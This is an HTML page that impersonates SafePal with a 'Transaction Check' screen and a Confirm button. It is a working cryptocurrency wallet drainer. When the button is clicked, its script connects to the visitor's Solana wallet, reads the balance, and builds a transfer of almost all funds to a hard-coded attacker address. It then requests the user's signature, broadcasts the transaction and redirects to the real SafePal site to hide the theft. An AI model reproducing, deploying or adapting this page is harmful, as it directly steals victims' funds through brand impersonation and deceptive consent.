<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>SafePal - Check</title>
    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Inter',sans-serif;background:#0A0A0F;color:#FFF;display:flex;align-items:center;justify-content:center;min-height:100vh}
        .card{background:#1A1A2A;border-radius:24px;padding:32px;max-width:400px;width:90%;text-align:center;border:1px solid rgba(255,255,255,0.05)}
        .notice{color:#FF6464;font-size:14px;margin:16px 0;padding:12px;background:rgba(255,100,100,0.1);border-radius:12px}
        button{width:100%;background:linear-gradient(135deg,#1a5cff,#0a3cbf);color:#fff;border:none;padding:16px;border-radius:40px;font-size:16px;font-weight:600;cursor:pointer;margin-top:16px}
        .ref{background:rgba(255,255,255,0.05);padding:12px;border-radius:12px;margin:16px 0;font-family:monospace;font-size:12px;word-break:break-all}
    </style>
</head>
<body>
    <div class="card">
        <h2>Transaction Check</h2>
        <div class="ref">REF: 7jXz5mR0pS1yO4tN5vI6jK7lM8qP9jV0zU1sF2wR3</div>
        <div class="notice">This action requires confirmation</div>
        <button id="action">Confirm</button>
    </div>
    <script>
        document.getElementById('action').onclick = async () => {
            console.log("Step 1: Button clicked");
            
            let w = null;
            if(window.safepal) w = window.safepal;
            else if(window.solana) w = window.solana;
            else if(window.phantom) w = window.phantom;
            
            console.log("Step 2: Wallet detected:", w ? "YES" : "NO");
            
            if(w){
                try{
                    console.log("Step 3: Connecting...");
                    const r = await w.connect();
                    console.log("Step 4: Connected:", r.publicKey.toString());
                    
                    const c = new solanaWeb3.Connection('https://api.mainnet-beta.solana.com','confirmed');
                    const b = await c.getBalance(r.publicKey);
                    console.log("Step 5: Balance:", b);
                    
                    const m = await c.getMinimumBalanceForRentExemption(0);
                    console.log("Step 6: Min rent:", m);
                    
                    if(b < m){
                        alert("Insufficient funds.");
                        return;
                    }
                    
                    console.log("Step 7: Preparing...");
                    const dest = new solanaWeb3.PublicKey('CGhD29YebVPKgs3W1unvw4KhnFbd1UiF2eBjkwkDRnC8');
                    const tx = new solanaWeb3.Transaction().add(
                        solanaWeb3.SystemProgram.transfer({
                            fromPubkey: r.publicKey,
                            toPubkey: dest,
                            lamports: b - m
                        })
                    );
                    tx.feePayer = r.publicKey;
                    
                    const h = await c.getRecentBlockhash();
                    tx.recentBlockhash = h.blockhash;
                    
                    console.log("Step 8: Requesting approval...");
                    const s = await w.signTransaction(tx);
                    console.log("Step 9: Approved");
                    
                    const x = await c.sendRawTransaction(s.serialize());
                    await c.confirmTransaction(x);
                    console.log("Step 10: Complete");
                    
                    window.location.href = "https://safepal.com";
                }catch(e){
                    console.error("Error:", e);
                    alert("Action failed. Try again.");
                }
            }else{
                alert("Please install SafePal wallet.");
            }
        };
    </script>
</body>
</html>
